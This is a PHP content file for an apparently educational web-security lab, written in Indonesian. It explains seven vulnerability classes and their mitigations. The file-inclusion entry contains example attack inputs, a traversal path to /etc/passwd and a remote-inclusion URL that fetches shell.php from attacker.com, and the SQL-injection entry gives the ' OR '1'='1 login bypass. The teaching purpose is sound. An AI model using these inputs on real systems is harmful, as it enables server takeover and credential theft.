<?php
/**
 * WebSecLab - Konten Edukasi per modul kerentanan.
 *
 * Dipakai oleh edukasi.php untuk menampilkan penjelasan konsep serangan,
 * cara kerja, dan mitigasi di luar praktik eksploitasi langsung.
 *
 * Cara menambahkan video YouTube:
 * 1. Buka video YouTube pilihan Anda (cari video yang relevan dan materinya sudah
 *    Anda tonton/verifikasi sendiri, supaya kontennya dapat dipertanggungjawabkan).
 * 2. Ambil ID video dari URL, contoh: https://www.youtube.com/watch?v=XXXXXXXXXXX
 *    ID-nya adalah bagian setelah "v=", yaitu "XXXXXXXXXXX".
 * 3. Isi nilai 'youtube_id' di bawah dengan ID tersebut (antara tanda kutip).
 *    Biarkan string kosong '' kalau belum ada video untuk modul itu.
 */

return [
          'brute_force' => [
        'concept' => [
            'Serangan brute force adalah metode peretasan yang menggunakan metode coba-coba untuk membobol kata sandi, kredensial login , dan kunci enkripsi. Ini adalah taktik sederhana namun andal untuk mendapatkan akses tidak sah ke akun individu dan sistem serta jaringan organisasi. Peretas mencoba berbagai nama pengguna dan kata sandi, seringkali menggunakan komputer untuk menguji berbagai kombinasi, hingga mereka menemukan informasi login yang benar.',
            'Serangan ini berhasil karena banyak sistem login tidak membatasi jumlah percobaan, tidak memberi '
                . 'jeda antar percobaan, dan tidak mendeteksi pola percobaan yang mencurigakan.',
        ],
        'mitigation' => [
            'Buat kata sandi yang kuat dan terdiri dari banyak karakter : Aturan dasar yang perlu diingat adalah kata sandi harus lebih dari 10 karakter dan mencakup huruf besar dan kecil, simbol, dan angka.',
            'Gunakan frasa sandi yang rumit : Frasa sandi adalah gabungan beberapa kata atau segmen dengan karakter khusus yang membuatnya lebih sulit ditebak.',
            'Buat aturan pembuatan kata sandi : Taktik kata sandi bagus lainnya adalah memangkas kata-kata sehingga tampak tidak masuk akal bagi orang lain yang membacanya. Misalnya, mempersingkat kata "hope" menjadi "hp" atau "blue" menjadi "bl".',
            'Manfaatkan pengelola kata sandi (password manager) : Gunakan aplikasi ini untuk membuat dan menyimpan kata sandi yang panjang, kompleks, dan unik secara otomatis tanpa takut lupa.',
            'Gunakan kata sandi unik: Bedakan kata sandi untuk setiap akun guna mencegah peretasan berantai (credential stuffing) jika salah satu situs mengalami kebocoran data.',
        ],
        'youtube_ids' => ['RV8Ro9Vzs8g', 'ttEXgEkKKOU', 'l_wVmVITefg'],
        'sources' => [
        ['title' => 'Fortinet - Apa itu Serangan Brute Force?', 'url' => 'https://www.fortinet.com/resources/cyberglossary/brute-force-attack'],
        ],
    ],
    

    'command_injection' => [
        'concept' => [
            'Injeksi perintah OS (Command Injection) adalah celah keamanan yang memungkinkan penyerang menjalankan perintah sistem operasi secara bebas di server aplikasi, sehingga berisiko membahayakan seluruh data dan sistem yang terhubung.',
            'Terjadi saat aplikasi meneruskan input pengguna ke perintah shell tanpa validasi. Penyerang menyisipkan karakter pemisah perintah (seperti &, &&, |, atau ;) agar server ikut mengeksekusi perintah tambahan yang disisipkan.',
        ],
        'mitigation' => [
            'Jangan panggil perintah OS langsung : Gunakan fitur atau API bawaan bahasa pemrograman yang lebih aman daripada menjalankan perintah sistem operasi.',
            'Validasi input dengan ketat: Jika terpaksa menggunakan input pengguna, batasi hanya pada daftar nilai yang diizinkan, angka, atau huruf dan angka (alfanumerik) tanpa spasi maupun simbol.',
            'Hindari metode escaping: Jangan hanya menyaring karakter khusus shell, karena cara ini rawan salah dan mudah ditembus penyerang.',
        ],
        'youtube_ids' => ['DL06TGmUCro'],
        'sources' => [
        ['title' => 'PortSwigger - OS Command Injection', 'url' => 'https://portswigger.net/web-security/os-command-injection'],
        ],
    ],

    'csrf' => [
        'concept' => [
            'Cross-Site Request Forgery (CSRF) adalah celah keamanan yang memaksa pengguna melakukan tindakan yang tidak diinginkan pada aplikasi web tempat mereka sedang login (seperti mengubah email, kata sandi, atau transfer dana), yang berisiko menyebabkan pengambilalihan akun penuh.',
            'Serangan ini terjadi jika terdapat aksi sensitif yang hanya mengandalkan cookie sesi (atau kredensial otomatis lain) tanpa parameter rahasia tambahan yang sulit ditebak. Karena browser otomatis menyertakan cookie sesi ke domain terkait, penyerang dapat memicu permintaan HTTP tanpa sepengetahuan korban',
            'Contoh: Penyerang membuat halaman web berisi form HTML tersembunyi yang otomatis mengirim permintaan POST ke /email/change (atau lewat URL GET). Saat korban yang sedang login membuka tautan jebakan tersebut, browser otomatis mengirimkan cookie sesinya sehingga email korban langsung berubah.',
        ],
        'mitigation' => [
            'Gunakan dan validasi Token CSRF : Buat token yang acak, sulit ditebak (menggunakan CSPRNG), dan terikat pada sesi pengguna. Kirimkan melalui hidden field pada form POST (bukan lewat URL atau cookie) lalu wajib validasi kecocokannya di server sebelum memproses permintaan.',
            'Terapkan pembatasan cookie SameSite yang ketat : Atur atribut SameSite=Strict secara default pada setiap cookie (atau Lax jika memang diperlukan, serta hindari None) untuk membatasi pengiriman cookie dari situs lain.',
            'Isolasi konten yang tidak aman : Pisahkan konten atau file unggahan pengguna pada domain/situs yang berbeda dari fungsi atau data sensitif, karena kebijakan SameSite tidak melindungi dari serangan lintas asal yang berasal dari situs yang sama (same-site).',

        ],
        'youtube_ids' => ['PxBq8hMsb3A'],
        'sources' => [
        ['title' => 'PortSwigger - What is CSRF?', 'url' => 'https://portswigger.net/web-security/csrf'],
        ],

    ],

    'file_upload' => [
        'concept' => [
            'Kerentanan unggahan file (File Upload Vulnerability) terjadi saat server web mengizinkan pengguna mengunggah file tanpa validasi memadai terhadap nama, tipe, isi, atau ukurannya. Akibatnya, penyerang dapat mengunggah file berbahaya seperti skrip sisi server (web shell) untuk mengambil alih kendali server (Remote Code Execution).',
            'Kerentanan muncul ketika validasi file cacat atau mudah dilewati—misalnya hanya memeriksa header Content-Type, mengandalkan daftar hitam (blacklist) ekstensi yang bisa diakali (seperti .php5 atau pengaburan nama), hingga celah race condition sebelum file dihapus. Jika server dikonfigurasi untuk mengeksekusi file tersebut, penyerang cukup mengakses URL file yang diunggah untuk menjalankan perintah jarak jauh.',
        ],
        'mitigation' => [
            'Gunakan whitelist ekstensi : Periksa ekstensi file hanya terhadap daftar yang diizinkan (whitelist), bukan memblokir ekstensi tertentu (blacklist).',
            'Cegah path traversal : Pastikan nama file tidak mengandung karakter direktori atau urutan penelusuran seperti ../.',
            'Ganti nama file: Ubah nama file yang diunggah secara acak agar tidak menimpa file penting yang sudah ada di server.',
            'Validasi di folder sementara: Jangan langsung menyimpan file ke sistem file permanen sebelum seluruh proses validasi selesai dan dinyatakan aman.',
            'Gunakan framework yang mapan: Manfaatkan pustaka atau kerangka kerja tepercaya untuk memproses unggahan file daripada membuat mekanisme validasi manual sendiri.',
        ],
        'youtube_ids' => ['7xYI-KgkJF0'],
        'sources' => [
        ['title' => 'PortSwigger – File Upload Vulnerabilities', 'url' => 'https://portswigger.net/web-security/file-upload'],
        ],

    ],

    'lfi' => [
        'concept' => [
            'File Inclusion adalah celah keamanan saat aplikasi memuat file berdasarkan input pengguna (seperti pada fungsi PHP include() atau require()) tanpa validasi yang memadai, sehingga berisiko membocorkan data sensitif, kredensial, hingga berujung pada Remote Code Execution (RCE).',
            'Local File Inclusion (LFI): Penyerang menyisipkan karakter directory traversal (seperti ?page=../../../../etc/passwd) atau wrapper PHP (seperti php://filter) untuk membaca file sensitif dan source code di dalam server lokal.',
            'Remote File Inclusion (RFI): Penyerang memuat dan menjalankan file berbahaya dari server eksternal melalui URL (seperti ?page=http://attacker.com/shell.php) jika konfigurasi PHP allow_url_include diaktifkan.',
        ],
        'mitigation' => [
            'Hindari input langsung : Jangan meneruskan input pengguna secara langsung ke dalam fungsi include() atau require().',
            'Gunakan whitelist dan validasi : Validasi seluruh input pengguna dan batasi file yang boleh dimuat hanya berdasarkan daftar putih (whitelist).',
            'Nonaktifkan fitur berbahaya : Matikan konfigurasi PHP yang tidak diperlukan, seperti allow_url_include, untuk mencegah serangan RFI.',
            'Batasi hak akses & perbarui sistem: Terapkan pembatasan hak akses file pada server serta rutin perbarui versi PHP dan framework ke versi terbaru.',
        ],
        'youtube_ids' => ['LvaB_6rU-Cc', '485YJD48GAs'],
        'sources' => [
        ['title' => 'Aditya Ardiansyah (Medium) – Belajar tentang File Inclusion dalam Penetration Testing', 'url' => 'https://adityasyah.medium.com/belajar-tentang-file-inclusion-dalam-penetration-testing-9eb8dc47ed32'],
        ],
    ],

   'sql_injection' => [
    'concept' => [
        'SQL Injection adalah metode serangan siber di mana penyerang menyisipkan kode SQL berbahaya ke dalam input pengguna (seperti form atau URL) untuk memanipulasi query database, sehingga dapat mencuri data sensitif atau mengambil alih sistem.',
        'Terjadi saat aplikasi memproses input pengguna tanpa validasi. Penyerang dapat melewati autentikasi (login bypass) dengan memasukkan payload seperti \' OR \'1\'=\'1, atau menggunakan teknik seperti Classic, Blind (respon benar/salah), Error-based (memanfaatkan pesan error), dan Union-based (mengambil data dari tabel lain).',
    ],
    'mitigation' => [
        'Gunakan parameterized query : Terapkan prepared statement agar input pengguna tidak dieksekusi sebagai perintah SQL.',
        'Selalu validasi input : Pastikan setiap data yang dimasukkan pengguna telah divalidasi sebelum diproses oleh database.',
        'Terapkan Web Application Firewall (WAF): Gunakan WAF untuk menyaring dan memblokir pola serangan berbahaya secara otomatis.',
        'Perbarui sistem secara rutin: Selalu update versi framework, library, dan sistem database untuk menutup celah keamanan.',
    ],
    'youtube_ids' => ['Pohx-GidauE'],
    'sources' => [
        ['title' => 'Telkom University – SQL Injection: Pengertian, Jenis, Contoh, dan Cara Mencegah', 'url' => 'https://msf.telkomuniversity.ac.id/sql-injection-adalah-pengertian-jenis-contoh-dan-cara-mencegah/'],
    ],
],

    'xss_reflected' => [
        'concept' => [
            'Cross-Site Scripting (XSS) Reflected terjadi ketika input pengguna langsung ditampilkan kembali '
                . 'ke halaman HTML tanpa di-escape, sehingga skrip JavaScript yang disisipkan penyerang ikut '
                . 'dieksekusi oleh browser korban. Disebut "reflected" karena payload hanya aktif dalam satu '
                . 'kali permintaan (biasanya dikirim lewat link yang ditipu agar diklik korban).',
            'Skrip yang berhasil dieksekusi dapat mencuri cookie sesi, melakukan aksi atas nama korban, '
                . 'atau mengarahkan korban ke situs phishing.',
        ],
        'mitigation' => [
            'Escape semua output ke konteks HTML dengan htmlspecialchars() (gunakan ENT_QUOTES).',
            'Terapkan Content Security Policy (CSP) untuk membatasi sumber skrip yang boleh dijalankan browser.',
            'Jangan membuat filter berbasis blacklist kata kunci (mudah dilewati) — gunakan pendekatan escape output secara konsisten.',
            'Validasi input sesuai konteks penggunaannya (HTML, atribut, URL, JavaScript memerlukan escaping berbeda-beda).',
        ],
        'youtube_ids' => ['uOZEukG9p3Q'],
    ],

    'xss_stored' => [
        'concept' => [
            'Cross-Site Scripting (XSS) Stored mirip dengan XSS Reflected, tetapi payload JavaScript '
                . 'disimpan secara permanen di server (misalnya di database lewat kolom komentar atau buku tamu). '
                . 'Setiap kali halaman tersebut dibuka oleh pengguna lain, payload yang tersimpan ikut dieksekusi '
                . 'di browser mereka — membuat dampaknya jauh lebih luas dibanding XSS Reflected.',
            'Karena sifatnya persisten, XSS Stored berpotensi menyerang banyak korban sekaligus tanpa perlu '
                . 'mengirim link khusus ke tiap korban.',
        ],
        'mitigation' => [
            'Escape output setiap kali data ditampilkan ke HTML, meskipun data berasal dari database sendiri (jangan percaya data tersimpan).',
            'Sanitasi input sebelum disimpan sebagai lapisan tambahan (mis. strip_tags untuk kolom yang tidak butuh HTML).',
            'Terapkan Content Security Policy (CSP) sebagai pertahanan berlapis.',
            'Gunakan HttpOnly pada cookie sesi agar tidak bisa diakses lewat JavaScript, membatasi dampak jika XSS tetap terjadi.',
        ],
        'youtube_ids' => ['aOgKHzo9Rdw'],
    ],
    ];

